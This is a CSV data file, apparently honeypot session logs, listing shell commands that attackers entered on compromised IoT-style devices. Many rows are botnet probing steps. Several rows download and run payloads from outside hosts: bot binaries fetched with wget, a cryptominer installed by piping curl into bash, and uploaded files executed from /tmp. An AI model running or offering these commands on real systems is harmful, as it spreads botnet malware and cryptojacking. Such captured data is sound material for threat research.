,session,duration,command_freq,input
365,ce2d6c9a590a,21.06158757209778,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
366,ce2d6c9a590a,21.06158757209778,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
367,ce2d6c9a590a,21.06158757209778,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
368,2e64a073689a,21.011593103408813,26,shell
369,2e64a073689a,21.011593103408813,26,shell
370,ce2d6c9a590a,21.06158757209778,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
371,2e64a073689a,21.011593103408813,26,sh
372,2e64a073689a,21.011593103408813,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
373,ce2d6c9a590a,21.06158757209778,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
374,2e64a073689a,21.011593103408813,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
375,ce2d6c9a590a,21.06158757209778,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
376,2e64a073689a,21.011593103408813,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
377,ce2d6c9a590a,21.06158757209778,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
378,2e64a073689a,21.011593103408813,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
379,ce2d6c9a590a,21.06158757209778,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
380,2e64a073689a,21.011593103408813,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
381,ce2d6c9a590a,21.06158757209778,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
382,2e64a073689a,21.011593103408813,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
383,ce2d6c9a590a,21.06158757209778,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
384,ce2d6c9a590a,21.06158757209778,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
385,ce2d6c9a590a,21.06158757209778,26,wget
386,ce2d6c9a590a,21.06158757209778,26,tftp
387,ce2d6c9a590a,21.06158757209778,26,ftpget
388,2e64a073689a,21.011593103408813,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
389,ce2d6c9a590a,21.06158757209778,26,/bin/busybox wget http://185.243.56.167/bot_x86_64_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.x86_64; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
390,ce2d6c9a590a,21.06158757209778,26,wget http://185.243.56.167/bot_x86_64_el -O-
391,2e64a073689a,21.011593103408813,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
392,2e64a073689a,21.011593103408813,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
393,2e64a073689a,21.011593103408813,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
394,2e64a073689a,21.011593103408813,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
395,2e64a073689a,21.011593103408813,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
396,2e64a073689a,21.011593103408813,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
397,2e64a073689a,21.011593103408813,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
398,2e64a073689a,21.011593103408813,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
399,2e64a073689a,21.011593103408813,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
400,2e64a073689a,21.011593103408813,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
401,2e64a073689a,21.011593103408813,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
402,2e64a073689a,21.011593103408813,26,wget
403,2e64a073689a,21.011593103408813,26,tftp
404,2e64a073689a,21.011593103408813,26,ftpget
405,2e64a073689a,21.011593103408813,26,/bin/busybox wget http://185.243.56.167/bot_arc_a5_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.arc_a5; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
406,2e64a073689a,21.011593103408813,26,wget http://185.243.56.167/bot_arc_a5_el -O-
407,bbe52cff1a69,0.743133306503295,2,cd /tmp; curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA; wget http://179.43.175.170/putkite/quickr1n.sh; curl -O http://179.43.175.170/putkite/quickr1n.sh; chmod 777 *; sh quickr1n.sh; echo storytime
408,bbe52cff1a69,0.743133306503295,2,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 492cUvVMbMsKpWGoSkTSbzix9Pk2Ho6XUid9vRSFALXjfQS76gyNGjnTh6DTpPHwnBAHDztwbWUGiCfZgkbndYtAMuekPcA
409,27b50618ce6a,1.172374486923217,13,enable
410,27b50618ce6a,1.172374486923217,13,system
411,27b50618ce6a,1.172374486923217,13,system
412,27b50618ce6a,1.172374486923217,13,shell
413,27b50618ce6a,1.172374486923217,13,shell
414,27b50618ce6a,1.172374486923217,13,sh
415,27b50618ce6a,1.172374486923217,13,cat /proc/mounts; /bin/busybox ZLRMX
416,27b50618ce6a,1.172374486923217,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZLRMX
417,27b50618ce6a,1.172374486923217,13,tftp; wget; /bin/busybox ZLRMX
418,27b50618ce6a,1.172374486923217,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
419,27b50618ce6a,1.172374486923217,13,while read i
420,27b50618ce6a,1.172374486923217,13,/bin/busybox ZLRMX
421,27b50618ce6a,1.172374486923217,13,rm .s; exit
422,b6cd8f4bc824,1.6783287525177002,4,shell
423,b6cd8f4bc824,1.6783287525177002,4,shell
424,b6cd8f4bc824,1.6783287525177002,4,sh
425,b6cd8f4bc824,1.6783287525177002,4,cat /bin/busybox
426,8369a6aebafd,18.63800930976868,26,shell
427,8369a6aebafd,18.63800930976868,26,shell
428,8369a6aebafd,18.63800930976868,26,sh
429,8369a6aebafd,18.63800930976868,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
430,8369a6aebafd,18.63800930976868,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
431,8369a6aebafd,18.63800930976868,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
432,8369a6aebafd,18.63800930976868,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
433,03060ee904f4,1.564405679702758,4,shell
434,03060ee904f4,1.564405679702758,4,shell
435,8369a6aebafd,18.63800930976868,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
436,8369a6aebafd,18.63800930976868,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
437,03060ee904f4,1.564405679702758,4,sh
438,03060ee904f4,1.564405679702758,4,cat /bin/busybox
439,8369a6aebafd,18.63800930976868,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
440,8369a6aebafd,18.63800930976868,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
441,8369a6aebafd,18.63800930976868,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
442,f7d670015a44,18.25634264945984,26,shell
443,f7d670015a44,18.25634264945984,26,shell
444,8369a6aebafd,18.63800930976868,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
445,f7d670015a44,18.25634264945984,26,sh
446,8369a6aebafd,18.63800930976868,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
447,8369a6aebafd,18.63800930976868,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
448,f7d670015a44,18.25634264945984,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
449,8369a6aebafd,18.63800930976868,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
450,f7d670015a44,18.25634264945984,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
451,8369a6aebafd,18.63800930976868,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
452,f7d670015a44,18.25634264945984,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
453,8369a6aebafd,18.63800930976868,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
454,f7d670015a44,18.25634264945984,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
455,f7d670015a44,18.25634264945984,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
456,f7d670015a44,18.25634264945984,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
457,f7d670015a44,18.25634264945984,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
458,8369a6aebafd,18.63800930976868,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
459,f7d670015a44,18.25634264945984,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
460,8369a6aebafd,18.63800930976868,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
461,8369a6aebafd,18.63800930976868,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
462,8369a6aebafd,18.63800930976868,26,wget
463,8369a6aebafd,18.63800930976868,26,tftp
464,8369a6aebafd,18.63800930976868,26,ftpget
465,f7d670015a44,18.25634264945984,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
466,8369a6aebafd,18.63800930976868,26,/bin/busybox wget http://185.243.56.167/bot_sh_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.sh; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
467,8369a6aebafd,18.63800930976868,26,wget http://185.243.56.167/bot_sh_el -O-
468,f7d670015a44,18.25634264945984,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
469,f7d670015a44,18.25634264945984,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
470,f7d670015a44,18.25634264945984,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
471,f7d670015a44,18.25634264945984,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
472,f7d670015a44,18.25634264945984,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
473,f7d670015a44,18.25634264945984,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
474,f7d670015a44,18.25634264945984,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
475,f7d670015a44,18.25634264945984,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
476,f7d670015a44,18.25634264945984,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
477,f7d670015a44,18.25634264945984,26,wget
478,f7d670015a44,18.25634264945984,26,tftp
479,f7d670015a44,18.25634264945984,26,ftpget
480,f7d670015a44,18.25634264945984,26,/bin/busybox wget http://185.243.56.167/bot_mn10300_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.mn10300; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
481,f7d670015a44,18.25634264945984,26,wget http://185.243.56.167/bot_mn10300_el -O-
482,850426867a45,12.754497766494753,4,shell
483,850426867a45,12.754497766494753,4,shell
484,850426867a45,12.754497766494753,4,sh
485,850426867a45,12.754497766494753,4,cat /bin/busybox
486,19a1bc2b85e7,0.393481492996215,1,scp -t /tmp/YiRXmMpc
487,0229492d3f44,0.409438848495483,3,cd /tmp && chmod +x YiRXmMpc && bash -c ./YiRXmMpc
488,0229492d3f44,0.409438848495483,3,./YiRXmMpc
489,0229492d3f44,0.409438848495483,3,./YiRXmMpc
490,da6ec546fcf2,0.834627151489257,13,enable
491,da6ec546fcf2,0.834627151489257,13,system
492,da6ec546fcf2,0.834627151489257,13,system
493,da6ec546fcf2,0.834627151489257,13,shell
494,da6ec546fcf2,0.834627151489257,13,shell
495,da6ec546fcf2,0.834627151489257,13,sh
496,da6ec546fcf2,0.834627151489257,13,cat /proc/mounts; /bin/busybox AZQOE
497,da6ec546fcf2,0.834627151489257,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox AZQOE
498,da6ec546fcf2,0.834627151489257,13,tftp; wget; /bin/busybox AZQOE
499,da6ec546fcf2,0.834627151489257,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
500,da6ec546fcf2,0.834627151489257,13,while read i
501,da6ec546fcf2,0.834627151489257,13,/bin/busybox AZQOE
502,da6ec546fcf2,0.834627151489257,13,rm .s; exit
503,e3767079b6fe,2.412325143814087,4,shell
504,e3767079b6fe,2.412325143814087,4,shell
505,e3767079b6fe,2.412325143814087,4,sh
506,e3767079b6fe,2.412325143814087,4,cat /bin/busybox
507,625743e7714f,2.139487743377685,13,enable
508,625743e7714f,2.139487743377685,13,system
509,625743e7714f,2.139487743377685,13,system
510,625743e7714f,2.139487743377685,13,shell
511,625743e7714f,2.139487743377685,13,shell
512,625743e7714f,2.139487743377685,13,sh
513,625743e7714f,2.139487743377685,13,cat /proc/mounts; /bin/busybox VOKXC
514,625743e7714f,2.139487743377685,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VOKXC
515,625743e7714f,2.139487743377685,13,tftp; wget; /bin/busybox VOKXC
516,625743e7714f,2.139487743377685,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
517,625743e7714f,2.139487743377685,13,while read i
518,625743e7714f,2.139487743377685,13,/bin/busybox VOKXC
519,625743e7714f,2.139487743377685,13,rm .s; exit
520,1f268f1e9a7c,6.503978967666626,4,shell
521,1f268f1e9a7c,6.503978967666626,4,shell
522,1f268f1e9a7c,6.503978967666626,4,sh
523,1f268f1e9a7c,6.503978967666626,4,cat /bin/busybox
524,b7af35902e6f,2.525197982788086,4,shell
525,b7af35902e6f,2.525197982788086,4,shell
526,b7af35902e6f,2.525197982788086,4,sh
527,b7af35902e6f,2.525197982788086,4,cat /bin/busybox
528,e7590a27a345,1.975313901901245,4,shell
529,e7590a27a345,1.975313901901245,4,shell
530,e7590a27a345,1.975313901901245,4,sh
531,e7590a27a345,1.975313901901245,4,cat /bin/busybox
532,ed606a2e91c9,2.154769897460937,4,shell
533,ed606a2e91c9,2.154769897460937,4,shell
534,ed606a2e91c9,2.154769897460937,4,sh
535,ed606a2e91c9,2.154769897460937,4,cat /bin/busybox
536,243c00af361a,60.30897045135498,1,wget 209.141.33.122/x86; chmod 777 x86; ./x86 nigga
537,8c72074041a5,14.989102125167848,19,start
538,8c72074041a5,14.989102125167848,19,start
539,8c72074041a5,14.989102125167848,19,enable
540,8c72074041a5,14.989102125167848,19,config terminal
541,8c72074041a5,14.989102125167848,19,config terminal
542,8c72074041a5,14.989102125167848,19,system
543,8c72074041a5,14.989102125167848,19,system
544,8c72074041a5,14.989102125167848,19,linuxshell
545,8c72074041a5,14.989102125167848,19,linuxshell
546,8c72074041a5,14.989102125167848,19,su
547,8c72074041a5,14.989102125167848,19,shell
548,8c72074041a5,14.989102125167848,19,shell
549,8c72074041a5,14.989102125167848,19,sh
550,8c72074041a5,14.989102125167848,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
551,8c72074041a5,14.989102125167848,19,echo -ne \x45\x4c\x46
552,8c72074041a5,14.989102125167848,19,/bin/busybox wget;/bin/busybox echo -ne '\x45\x4c\x46'
553,8c72074041a5,14.989102125167848,19,wget
554,8c72074041a5,14.989102125167848,19,echo -ne \x45\x4c\x46
555,8c72074041a5,14.989102125167848,19,cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\x63\x6F\x6E\x6E\x65\x63\x74\x65\x64'
556,18e7adda8252,4.523862600326538,13,enable
557,18e7adda8252,4.523862600326538,13,system
558,18e7adda8252,4.523862600326538,13,system
559,18e7adda8252,4.523862600326538,13,shell
560,18e7adda8252,4.523862600326538,13,shell
561,18e7adda8252,4.523862600326538,13,sh
562,18e7adda8252,4.523862600326538,13,cat /proc/mounts; /bin/busybox PVNEV
563,18e7adda8252,4.523862600326538,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PVNEV
564,18e7adda8252,4.523862600326538,13,tftp; wget; /bin/busybox PVNEV
565,18e7adda8252,4.523862600326538,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
566,18e7adda8252,4.523862600326538,13,while read i
567,18e7adda8252,4.523862600326538,13,/bin/busybox PVNEV
568,18e7adda8252,4.523862600326538,13,rm .s; exit
569,8b5546d2d6c8,1.222063779830932,1,wget
570,102face67ea4,2.506415605545044,13,enable
571,102face67ea4,2.506415605545044,13,system
572,102face67ea4,2.506415605545044,13,system
573,102face67ea4,2.506415605545044,13,shell
574,102face67ea4,2.506415605545044,13,shell
575,102face67ea4,2.506415605545044,13,sh
576,102face67ea4,2.506415605545044,13,cat /proc/mounts; /bin/busybox WIBLH
577,102face67ea4,2.506415605545044,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WIBLH
578,102face67ea4,2.506415605545044,13,tftp; wget; /bin/busybox WIBLH
579,102face67ea4,2.506415605545044,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
580,102face67ea4,2.506415605545044,13,while read i
581,102face67ea4,2.506415605545044,13,/bin/busybox WIBLH
582,102face67ea4,2.506415605545044,13,rm .s; exit
583,f87cc040d1af,2.955207347869873,13,enable
584,f87cc040d1af,2.955207347869873,13,system
585,f87cc040d1af,2.955207347869873,13,system
586,f87cc040d1af,2.955207347869873,13,shell
587,f87cc040d1af,2.955207347869873,13,shell
588,f87cc040d1af,2.955207347869873,13,sh
589,f87cc040d1af,2.955207347869873,13,cat /proc/mounts; /bin/busybox VDLNA
590,f87cc040d1af,2.955207347869873,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox VDLNA
591,f87cc040d1af,2.955207347869873,13,tftp; wget; /bin/busybox VDLNA
592,f87cc040d1af,2.955207347869873,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
593,f87cc040d1af,2.955207347869873,13,while read i
594,f87cc040d1af,2.955207347869873,13,/bin/busybox VDLNA
595,f87cc040d1af,2.955207347869873,13,rm .s; exit
596,d861680b21fb,0.8088693618774411,1,scp -t /tmp/CYAmbkym
597,ae7cf38404b2,0.8821885585784911,1,scp -t /tmp/CYAmbkym
598,fe9d7fa721ba,0.760278463363647,3,cd /tmp && chmod +x CYAmbkym && bash -c ./CYAmbkym
599,fe9d7fa721ba,0.760278463363647,3,./CYAmbkym
600,fe9d7fa721ba,0.760278463363647,3,./CYAmbkym
601,01806b498941,0.72888445854187,3,cd /tmp && chmod +x CYAmbkym && bash -c ./CYAmbkym
602,01806b498941,0.72888445854187,3,./CYAmbkym
603,01806b498941,0.72888445854187,3,./CYAmbkym
604,20fdb0f16f20,106.31333017349245,9,/ip cloud print
605,20fdb0f16f20,106.31333017349245,9,/ip cloud print
606,20fdb0f16f20,106.31333017349245,9,ifconfig
607,20fdb0f16f20,106.31333017349245,9,uname -a
608,20fdb0f16f20,106.31333017349245,9,cat /proc/cpuinfo
609,20fdb0f16f20,106.31333017349245,9,ps | grep '[Mm]iner'
610,20fdb0f16f20,106.31333017349245,9,ps -ef | grep '[Mm]iner'
